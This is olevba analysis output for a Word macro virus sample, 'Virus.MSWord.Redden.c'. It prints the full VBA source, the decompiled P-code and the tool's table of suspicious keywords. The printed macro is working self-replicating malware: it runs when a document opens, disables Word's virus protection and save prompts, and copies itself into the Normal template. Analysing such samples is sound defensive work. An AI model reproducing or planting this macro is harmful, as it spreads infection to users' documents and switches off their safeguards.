olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Redden.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Redden.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set stlth = ActiveDocument.VBProject
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
Set stlth = NormalTemplate.VBProject
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
cnt = stlth.VBComponents.Count
If cnt <> 0 Then
For i = 1 To cnt
aprj = stlth.VBComponents(i).Name
If aprj = "SimplyRed" Then already = True
Next i
Else
already = False
End If
If Not already Then
stlth.VBComponents.Add (vbext_ct_StdModule)
stlth.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "SimplyRed"
End If
Phuck:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Redden.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2625 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError Phuck 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #6:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set stlth 
' Line #7:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #8:
' 	ElseBlock 
' Line #9:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #10:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #11:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set stlth 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	Ld dest 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cou 
' Line #14:
' 	Ld cou 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #15:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cou 
' 	For 
' Line #16:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #17:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld sour 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' Line #20:
' 	Ld lin 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #21:
' 	LitVarSpecial (False)
' 	St already 
' Line #22:
' 	Ld stlth 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St cnt 
' Line #23:
' 	Ld cnt 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cnt 
' 	For 
' Line #25:
' 	Ld i 
' 	Ld stlth 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St aprj 
' Line #26:
' 	Ld aprj 
' 	LitStr 0x0009 "SimplyRed"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St already 
' 	EndIf 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	ElseBlock 
' Line #29:
' 	LitVarSpecial (False)
' 	St already 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld already 
' 	Not 
' 	IfBlock 
' Line #32:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld stlth 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #33:
' 	LitStr 0x0009 "SimplyRed"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld stlth 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	Label Phuck 
' Line #36:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

